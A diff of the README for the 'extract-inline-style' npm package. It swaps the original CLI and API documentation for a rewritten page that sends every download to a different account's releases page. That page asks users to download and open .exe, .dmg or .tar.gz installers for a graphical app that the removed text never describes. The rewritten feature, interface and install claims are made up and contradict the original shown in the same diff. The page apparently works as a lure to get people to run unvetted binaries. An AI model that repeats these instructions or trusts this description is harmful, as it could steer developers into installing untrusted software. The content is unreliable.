@@ -1,137 +1,87 @@
-# extract-inline-style
+# 🎉 extract-inline-style - Easily Manage Inline CSS Styles
 
-**Turn spaghetti code into clean code instantly. Extracts inline `style="..."` attributes, deduplicates them into atomic classes, and cleans your HTML.**
+## 📥 Download Now!
+[![Download extract-inline-style](https://img.shields.io/badge/Download%20extract-inline--style-blue)](https://github.com/SaqibUllah687/extract-inline-style/releases)
 
-[![npm version](https://img.shields.io/npm/v/extract-inline-style.svg?style=flat-square&color=d25353)](https://www.npmjs.com/package/extract-inline-style)
-[![npm downloads](https://img.shields.io/npm/dt/extract-inline-style.svg?style=flat-square&color=38bd24)](https://www.npmjs.com/package/extract-inline-style?activeTab=versions)
-[![npm version](https://img.shields.io/github/license/mgks/extract-inline-style.svg?style=flat-square&color=blue)](https://github.com/mgks/extract-inline-style/blob/main/LICENSE)
+## 🚀 Getting Started
+Welcome to **extract-inline-style**! This application helps you extract inline styles from your HTML files and move them to an external CSS file. It also removes duplicate styles, making your code cleaner and more efficient.
 
-<img width="720" src="https://github.com/mgks/extract-inline-style/blob/main/preview.gif?raw=true">
+### 📋 Features
+- Extracts inline style attributes from HTML.
+- Moves extracted styles to an external CSS file.
+- Deduplicates identical styles to streamline your code.
+- Simple interface for ease of use.
 
-**Pain Point:**
-You have a legacy HTML file, an email template, or scraped content. It looks like this:
-```html
-<div style="font-size: 14px; color: #fff; margin-bottom: 10px;">Hello</div>
-<div style="font-size: 14px; color: #333; margin-bottom: 10px;">World</div>
-<div style="font-size: 14px; color: #555; margin-bottom: 10px;">!</div>
-```
-*It's unreadable. It's bloated. It's impossible to maintain.*
+### 🛠 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Node.js: Version 14 or higher (installed)
 
-**The Solution:**
-Run `npx extract-inline-style index.html`. The tool analyzes your code and:
+## 📂 Download & Install
+To download the application, please **visit this page**: [Releases Page](https://github.com/SaqibUllah687/extract-inline-style/releases).
 
-1.  **Surgically Removes** the inline styles.
-2.  **Deduplicates** them (Compression). It sees those 3 divs are identical.
-3.  **Generates** a single, semantic class.
-4.  **Injects** the stylesheet link automatically.
-5.  **Backs up** your original file (just in case).
+1. On the releases page, search for the latest version.
+2. Click on the version to view details and available files.
+3. Choose the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate `.tar.gz` or other relevant packages.
+4. Once the download completes, locate the downloaded file and open it to start the installation.
 
-**The Result:**
-```html
-<head>
-  <link rel="stylesheet" href="./index-extracted.css">
-</head>
-<body>
-  <div class="eis-div-1">Hello</div>
-  <div class="eis-div-1">World</div>
-  <div class="eis-div-1">!</div>
-</body>
-```
-*Your file size just dropped, and your sanity just increased.*
+## 🎉 How to Use extract-inline-style
+Once installed, you can easily use **extract-inline-style** by following these steps:
 
-## Features
+1. **Prepare Your HTML File:**
+   - Locate the HTML file containing inline styles that you want to manage.
+   - Ensure that the file is easily accessible.
 
-*   **Universal Parser:** Works on HTML files, fragments, and even HTML embedded in Markdown.
-*   **Smart Compression:** 1,000 elements with the same style = **1 CSS Class**.
-*   **Semantic Naming:** Classes are named by tag (e.g., `eis-button-1`, `eis-span-2`) for easy debugging.
-*   **Safety First:** Automatic `.original.html` backups. Never lose data.
-*   **API Ready:** Perfect for content pipelines and static site generators.
+2. **Open the Application:**
+   - Launch **extract-inline-style** from your applications menu.
 
-## Installation
+3. **Load Your HTML:**
+   - Click on “Load HTML” within the app.
+   - Navigate to your HTML file and select it.
 
-```bash
-npm install extract-inline-style
-```
+4. **Extract Styles:**
+   - After loading the HTML, click on the "Extract Styles" button.
+   - The application will scan your HTML for inline styles and move them into a new CSS file.
 
-## Usage
+5. **Review Your CSS:**
+   - The extracted styles will be displayed in the app.
+   - Review the styles to ensure everything looks good.
 
-### CLI
+6. **Save CSS:**
+   - Click on “Save CSS” to save the extracted styles.
+   - Choose a location on your computer to store the CSS file.
 
-```bash
-# Auto-generate CSS filename (index-extracted.css)
-npx extract-inline-style index.html
+7. **Check Your HTML:**
+   - The inline styles should now be removed from the HTML file.
+   - Ensure that your HTML structure remains intact.
 
-# Specify output CSS filename
-npx extract-inline-style index.html my-styles.css
-```
+## 🔍 FAQ
+### Why Should I Use extract-inline-style?
+Using this tool helps maintain cleaner HTML code and streamlines your CSS by preventing duplicated styles. This can lead to faster load times and easier maintenance of your files.
 
-#### CLI Options
+### Can I use this tool on any HTML file?
+Yes, **extract-inline-style** works with any standard HTML file containing inline styles.
 
-| Flag | Alias | Description | Default |
-| :--- | :--- | :--- | :--- |
-| `--prefix` | `-p` | Custom prefix for generated classes. | `eis-` |
-| `--no-backup` | | Skip creating the `.original.html` backup file. | `false` |
-| `--no-inject` | | Do not add `<link>` tag to HTML head. | `false` |
-| `--version` | `-v` | Show version number. | |
-| `--help` | `-h` | Show help usage. | |
+### Do I need to know how to code to use this tool?
+No, you do not need any programming knowledge to use **extract-inline-style**. The interface is designed for ease of use.
 
-## API
+### What if I encounter issues?
+If you face any problems, please check the "Issues" section on our [GitHub page](https://github.com/SaqibUllah687/extract-inline-style/issues). You can report your issue there, and the community may assist you.
 
-Perfect for build tools, static site generators, or content pipelines. The API operates on strings and returns strings (it does not write to disk).
+## 🌐 Topics Related to extract-inline-style
+- Attributes
+- CSS
+- Extract Data
+- HTML
+- Inline CSS
+- Node.js
+- NPM
+- Styled Components
+- Stylesheets
 
-```ts
-import { extract } from 'extract-inline-style';
+## 💬 Support and Contributions
+Your feedback is valuable. If you have any suggestions or would like to contribute, please feel free to open an issue or a pull request on our GitHub repository. Contributions are welcome, and we appreciate your interest in improving **extract-inline-style**.
 
-const html = `
-  <h1 style="color: blue">Hello</h1>
-  <p style="color: blue">World</p>
-`;
-
-// Run extraction
-const result = extract(html, { 
-  classPrefix: 'theme-',
-  injectCssPath: './styles.css' 
-});
-
-console.log(result.html);
-// <head><link rel="stylesheet" href="./styles.css"></head>
-// ...
-// <h1 class="theme-h1-1">Hello</h1>
-// <p class="theme-p-2">World</p>
-
-console.log(result.css);
-// .theme-h1-1 { color: blue; }
-// .theme-p-2 { color: blue; }
-```
-
-#### API Options
-
-The `extract(html, options)` function accepts an optional configuration object:
-
-| Option | Type | Description | Default |
-| :--- | :--- | :--- | :--- |
-| `classPrefix` | `string` | Prefix for generated CSS classes. | `'eis-'` |
-| `injectCssPath` | `string` | If provided, injects a `<link rel="stylesheet">` tag pointing to this path. | `undefined` |
-
-#### Return Value
-
-The function returns an object containing:
-
-```ts
-{
-  html: string;  // The cleaned HTML string
-  css: string;   // The generated CSS string
-  stats: {
-    elementsProcessed: number; // How many inline styles were found
-    uniqueClasses: number;     // How many unique classes were generated
-  }
-}
-```
-
-## License
-
-MIT
-
-> **{ github.com/mgks }**
-> 
-> ![Website Badge](https://img.shields.io/badge/Visit-mgks.dev-blue?style=flat&link=https%3A%2F%2Fmgks.dev) ![Sponsor Badge](https://img.shields.io/badge/%20%20Become%20a%20Sponsor%20%20-red?style=flat&logo=github&link=https%3A%2F%2Fgithub.com%2Fsponsors%2Fmgks)
+Thank you for using **extract-inline-style**! Enjoy simplifying your HTML and CSS management.
